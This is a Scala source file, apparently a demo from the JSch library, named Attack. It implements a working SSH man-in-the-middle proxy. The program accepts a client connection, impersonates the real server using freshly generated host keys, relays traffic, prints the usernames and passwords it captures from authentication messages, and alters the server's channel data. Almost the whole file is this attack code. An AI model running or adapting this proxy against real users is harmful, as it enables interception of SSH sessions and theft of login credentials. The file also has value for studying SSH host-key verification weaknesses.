/* -*-mode:java; c-basic-offset:2; indent-tabs-mode:nil -*- */
/*
Copyright (c) 2009 ymnk, JCraft,Inc. All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

  1. Redistributions of source code must retain the above copyright notice,
     this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright 
     notice, this list of conditions and the following disclaimer in 
     the documentation and/or other materials provided with the distribution.

  3. The names of the authors may not be used to endorse or promote products
     derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESSED OR IMPLIED WARRANTIES,
INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL JCRAFT,
INC. OR ANY CONTRIBUTORS TO THIS SOFTWARE BE LIABLE FOR ANY DIRECT, INDIRECT,
INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA,
OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

package com.jcraft.jsch.mitm

import java.net._
import java.io._
import com.jcraft.jsch._

object Attack{
  val ssh_host_dsa_key = new File(".", "ssh_host_dsa_key")
  val ssh_host_rsa_key = new File(".", "ssh_host_rsa_key")

  def main(arg:Array[String]){

      val(listenning_port, host, port) = 
        (arg(0).toInt, arg(1), arg(2).toInt)

      val jsch = new JSch()

      checkKeys(jsch)

      val ssocket = new ServerSocket(listenning_port)
      val s = ssocket.accept()

      val ss = new SessionServer(jsch, s)
      val sc = new SessionClient(jsch)

      val ss_monitor = new Monitor(sc)(clientMonitor)
      ss.setPacketListener(ss_monitor)

      val sc_monitor = new Monitor(ss)(serverMonitor)
      sc.setPacketListener(sc_monitor)

      sc.setHost(host)
      sc.setPort(port)
      sc.openConnection(0)

      val vs = sc.readVersionString
      ss.setServerVersion(vs)

      sc.writeVersionString
      sc.keyExchange

      sc.startConnectionThread

      List(("diffie-hellman-group1-sha1" ->  
             "com.jcraft.jsch.DHG1Server"),
           ("diffie-hellman-group-exchange-sha1" -> 
             "com.jcraft.jsch.DHGEXServer"),
           ("ssh-dss" -> ssh_host_dsa_key.getAbsolutePath),
           ("ssh-rsa" -> ssh_host_rsa_key.getAbsolutePath),
           ("server_host_key" -> "ssh-dss")).map{
        case(k, v) => ss.setConfig(k, v)
      }

      ss.openConnection(0)
      ss.writeVersionString
      ss.readVersionString
      ss.keyExchange
      ss.startConnectionThread
  }

  def checkKeys(jsch:JSch){
    if(!ssh_host_dsa_key.exists){
      val kpair=KeyPair.genKeyPair(jsch, KeyPair.DSA)
      kpair.writePrivateKey(ssh_host_dsa_key.getAbsolutePath())
      kpair.writePublicKey(ssh_host_dsa_key.getAbsolutePath()+".pub", "")
      kpair.dispose()
    }

    if(!ssh_host_rsa_key.exists){
      val kpair=KeyPair.genKeyPair(jsch, KeyPair.RSA)
      kpair.writePrivateKey(ssh_host_rsa_key.getAbsolutePath())
      kpair.writePublicKey(ssh_host_rsa_key.getAbsolutePath()+".pub", "")
      kpair.dispose
    }
  }

  def serverMonitor: Packet => Unit = p => {
    println("from server: "+p.getBuffer.getCommand)
    val start = new Array[Int](1)
    val length = new Array[Int](1)
    p.getBuffer.getCommand match{
      case 94 =>
        val buf = p.getBuffer
        buf.getInt; buf.getByte; buf.getByte; buf.getInt
        val foo=buf.getString(start, length)
        println("from server> "+new String(foo, start(0), length(0))+"|")

        // toUpperCase
        var i = start(0)
        while(i < start(0)+length(0)){
          foo(i) = if(0x61<=foo(i)&&foo(i)<=0x7a)(foo(i)-32).asInstanceOf[Byte]
                   else foo(i)
          i += 1
        }
      case _ =>
    }
    p.getBuffer.rewind
  }

  def clientMonitor: Packet => Unit =  p => {
    println("from client: "+p.getBuffer.getCommand)
    val start = new Array[Int](1)
    val length = new Array[Int](1)
    p.getBuffer.getCommand match{
      case 94 =>
        val buf = p.getBuffer
        buf.getInt; buf.getByte; buf.getByte; buf.getInt
        val foo=buf.getString(start, length)
        println("from client> "+new String(foo, start(0), length(0)))
      case 50 =>
        val buf = p.getBuffer
        buf.getInt; buf.getByte; buf.getByte;
        var foo=buf.getString(start, length)
        val username = new String(foo, start(0), length(0))
        buf.getString(start, length)
        foo=buf.getString(start, length)
        new String(foo, start(0), length(0)) match{
          case "password" =>
            buf.getByte
            foo=buf.getString(start, length)
            println("user: "+username+", "+
                    "password: "+new String(foo, start(0), length(0))) 
          case "keyboard-interactive" =>
            // for "keyboard-interactive",
            // SSH_MSG_USERAUTH_INFO_RESPONSE(61) should be checked.
          case _ =>
        }
      case 61 =>
        val buf = p.getBuffer
        buf.getInt; buf.getByte; buf.getByte;
        buf.getInt match {
          case 1 => 
            val foo=buf.getString(start, length)
            println("password: "+new String(foo, start(0), length(0))) 
          case _ => 
        }
      case _ =>
    }
    p.getBuffer.rewind
  }
}
